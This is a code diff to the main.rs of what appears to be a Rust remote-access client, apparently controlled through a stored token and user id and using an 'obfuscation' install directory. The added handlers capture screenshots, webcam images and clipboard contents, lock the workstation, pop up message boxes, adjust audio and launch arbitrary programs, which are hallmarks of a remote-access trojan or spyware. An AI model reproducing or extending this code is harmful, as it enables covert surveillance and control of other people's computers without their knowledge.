@@ -49,17 +49,6 @@ fn init_foreground_logger() {
     }
 }
 
-fn cleanup_old_files() {
-    let home = security::obfuscation::install_home();
-    if let Ok(entries) = std::fs::read_dir(home) {
-        for entry in entries.flatten() {
-            if entry.path().extension().is_some_and(|e| e == "old") {
-                let _ = std::fs::remove_file(entry.path());
-            }
-        }
-    }
-}
-
 fn main() -> Result<()> {
     let args: Vec<String> = env::args().collect();
 
@@ -74,7 +63,7 @@ fn main() -> Result<()> {
             )
             .ok();
             check_already_running()?;
-            cleanup_old_files();
+            service::install::cleanup_old_files();
             let token = args[2].clone();
             let uid: i64 = args[3].parse()?;
             let cfg = service::config::AppConfig {
@@ -114,6 +103,54 @@ fn main() -> Result<()> {
             let uid: i64 = args[3].parse()?;
             service::config::save_to_registry(token, uid)?;
             log::info!("Registry updated");
+            Ok(())
+        }
+        Some("--screenshot") => {
+            if let Some(path) = args.get(2) {
+                commands::screenshot::capture_to_file(path)?;
+            }
+            Ok(())
+        }
+        Some("--msgbox") => {
+            let text = args.get(2).map(|s| s.as_str()).unwrap_or("");
+            commands::msgbox::show_blocking(text);
+            Ok(())
+        }
+        Some("--clipboard") => {
+            commands::clipboard::capture_clipboard()?;
+            Ok(())
+        }
+        Some("--camera") => {
+            if let Some(path) = args.get(2) {
+                commands::camera::capture_to_file(path)?;
+            }
+            Ok(())
+        }
+        Some("--lock") => {
+            commands::system::lock_workstation();
+            Ok(())
+        }
+        Some("--wallpaper") => {
+            commands::wallpaper::print_wallpaper_path();
+            Ok(())
+        }
+        Some("--audio") => {
+            let action = args.get(2).map(|s| s.as_str()).unwrap_or("");
+            match action {
+                "mute" => commands::audio::do_mute(),
+                "unmute" => commands::audio::do_unmute(),
+                "set" => {
+                    let level: u8 = args.get(3).and_then(|s| s.parse().ok()).unwrap_or(50);
+                    commands::audio::do_set_volume(level)
+                }
+                _ => Ok(()),
+            }?;
+            Ok(())
+        }
+        Some("--run-program") => {
+            if let Some(path) = args.get(2) {
+                let _ = std::process::Command::new(path).spawn();
+            }
             Ok(())
         }
         Some("--uninstall") => {
